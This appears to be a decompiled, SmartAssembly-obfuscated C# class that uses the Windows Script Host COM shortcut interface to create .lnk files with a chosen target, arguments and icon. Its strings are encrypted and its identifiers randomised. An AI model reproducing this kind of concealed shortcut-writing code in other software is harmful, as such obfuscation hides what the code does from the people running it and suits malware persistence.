using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KNpKkassJHAdE;

public sealed class XRlDJzMhIlmoI
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface pVTVWqAcoYbq
	{
		[DispId(0)]
		string fdVpFFwWcOeQRqdYroy
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string wXFqNPAGRvznBG
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string tIeoOVYGuSJrmDa
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string uZkBIMtUfit
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string dWdXBMIoWd
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string KMLnePuxtjc
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string yMtYLtGGcVkDuI
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int CgxmXqYrafkkyGnj
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string aOYIQwnmnii
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type tiSUtfOvMTj;

	private static object WCRLoZphBtPMYi;

	[NonSerialized]
	internal static GetString getString_0;

	public static void TGdSFhaBMmTJsCaI(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			pVTVWqAcoYbq pVTVWqAcoYbq = (pVTVWqAcoYbq)tiSUtfOvMTj.InvokeMember(GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107461253)), BindingFlags.InvokeMethod, null, WCRLoZphBtPMYi, new object[1] { string_0 });
			pVTVWqAcoYbq.tIeoOVYGuSJrmDa = string_4;
			pVTVWqAcoYbq.uZkBIMtUfit = string_5;
			pVTVWqAcoYbq.yMtYLtGGcVkDuI = string_1;
			pVTVWqAcoYbq.aOYIQwnmnii = string_3;
			pVTVWqAcoYbq.wXFqNPAGRvznBG = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				pVTVWqAcoYbq.dWdXBMIoWd = string_6;
			}
			pVTVWqAcoYbq.Save();
		}
		catch (Exception ex)
		{
			if (GvesiNnPBqLNWZ.xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(GvesiNnPBqLNWZ.YnUuGHOKmtC, getString_0(107461224) + ex.Message + getString_0(107397147));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static XRlDJzMhIlmoI()
	{
		Strings.CreateGetStringDelegate(typeof(XRlDJzMhIlmoI));
		tiSUtfOvMTj = Type.GetTypeFromProgID(GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107461211)));
		WCRLoZphBtPMYi = Activator.CreateInstance(tiSUtfOvMTj);
	}
}
